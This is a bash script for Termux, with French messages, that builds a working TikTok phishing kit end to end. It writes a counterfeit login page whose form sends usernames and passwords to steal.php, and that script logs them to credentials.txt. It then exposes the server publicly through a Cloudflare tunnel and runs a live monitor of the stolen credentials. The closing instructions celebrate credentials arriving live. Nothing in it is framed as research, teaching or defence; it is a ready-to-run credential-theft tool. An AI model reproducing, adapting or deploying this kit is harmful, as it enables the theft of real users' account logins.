#!/data/data/com.termux/files/usr/bin/bash

PHISH_DIR="$HOME/tiktok_cloudflare"
mkdir -p $PHISH_DIR
cd $PHISH_DIR

cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion • TikTok</title>
    <link rel="stylesheet" href="https://www.tiktokv.com/style.css">
    <style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;}.container{background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);overflow:hidden;max-width:400px;width:90%;}.header{background:linear-gradient(135deg,#ff0050 0%,#ff4d6d 100%);color:white;padding:30px 20px;text-align:center;}.header i{font-size:48px;margin-bottom:10px;}.header h1{font-size:24px;font-weight:600;}.form-container{padding:40px 30px;}.input-group{margin-bottom:20px;}.input-group label{display:block;margin-bottom:8px;color:#333;font-size:14px;font-weight:500;}.input-group input{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:all 0.3s ease;}.input-group input:focus{outline:none;border-color:#ff0050;box-shadow:0 0 0 3px rgba(255,0,80,0.1);}.login-btn{width:100%;padding:15px;background:linear-gradient(135deg,#ff0050 0%,#ff4d6d 100%);color:white;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s ease;}.login-btn:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(255,0,80,0.3);}.login-btn:active{transform:translateY(0);}.divider{text-align:center;margin:30px 0;position:relative;}.divider::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#e1e5e9;}.divider span{background:white;padding:0 20px;color:#666;font-size:14px;}#status{display:none;text-align:center;padding:20px;}.success{background:#d4edda;color:#155724;border-radius:10px;}.error{background:#f8d7da;color:#721c24;border-radius:10px;}@media (max-width:480px){.container{margin:20px;width:calc(100%-40px);}}</style>
</head>
<body>
    <div class="container">
        <div class="header">
            <i class="fab fa-tiktok" style="font-family:FontAwesome"></i>
            <h1>Connexion</h1>
        </div>
        <div class="form-container">
            <form id="loginForm">
                <div class="input-group">
                    <label>Numéro, email ou username</label>
                    <input type="text" id="username" required>
                </div>
                <div class="input-group">
                    <label>Mot de passe</label>
                    <input type="password" id="password" required>
                </div>
                <button type="submit" class="login-btn">Se connecter</button>
            </form>
            <div id="status"></div>
        </div>
    </div>
    <script>
    document.getElementById('loginForm').addEventListener('submit',async e=>{e.preventDefault();const u=document.getElementById('username').value,p=document.getElementById('password').value,s=document.getElementById('status');s.textContent='Connexion...';s.className='success';s.style.display='block';await fetch('/steal.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>r.json()).then(d=>{if(d.success){s.innerHTML='✅ Connexion réussie !';setTimeout(()=>window.location.href='https://www.tiktok.com',1500)}else throw d.message}).catch(e=>{s.textContent='❌ Erreur';s.className='error';})});
    </script>
</body>
</html>
EOF

cat > steal.php << 'EOF'
<?php
header('Content-Type: application/json');
if($_SERVER['REQUEST_METHOD']==='POST'){
    $input=json_decode(file_get_contents('php://input'),true);
    if(isset($input['username'])&&isset($input['password'])){
        $log="[".date('Y-m-d H:i:s')."] ".$input['username'].":".$input['password']."\n";
        file_put_contents('credentials.txt',$log,FILE_APPEND|LOCK_EX);
        echo json_encode(['success'=>true]);
        exit;
    }
}
echo json_encode(['success'=>false]);
?>
EOF

cat > cloudflare.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
pkg install cloudflared -y
cloudflared tunnel --url http://localhost:8080
EOF

cat > monitor.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
while true; do
    clear
    echo "=== TIKTOK PHISH LIVE ==="
    echo "URL publique: $CLOUDFLARE_URL"
    echo "Derniers logs:"
    tail -15 credentials.txt
    echo "Total: $(wc -l < credentials.txt)"
    sleep 3
done
EOF

cat > start.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
echo "🚀 Démarrage TikTok Phishing + Cloudflare..."
php -S 0.0.0.0:8080 > /dev/null 2>&1 &
PHP_PID=$!
echo $PHP_PID > php.pid
sleep 3
echo "✅ PHP: http://localhost:8080"
bash cloudflare.sh &
CLOUDFLARE_PID=$!
echo $CLOUDFLARE_PID > cloudflare.pid
echo "🔗 Cloudflare tunnel démarré - copie l'URL ci-dessus !"
bash monitor.sh
kill $PHP_PID $CLOUDFLARE_PID 2>/dev/null
EOF

chmod +x *.sh

cat << EOF
✅ TikTok Phishing + Cloudflare prêt dans $PHISH_DIR

🚀 Déploiement complet:
cd $PHISH_DIR && ./start.sh

📱 Ce que ça fait automatiquement:
• Lance PHP serveur (8080)
• Ouvre tunnel Cloudflare public
• Affiche URL publique en temps réel
• Monitor live credentials dans Termux
• Logs instantanés dans credentials.txt

🔥 Credentials arrivent DIRECTEMENT dans Termux live !
EOF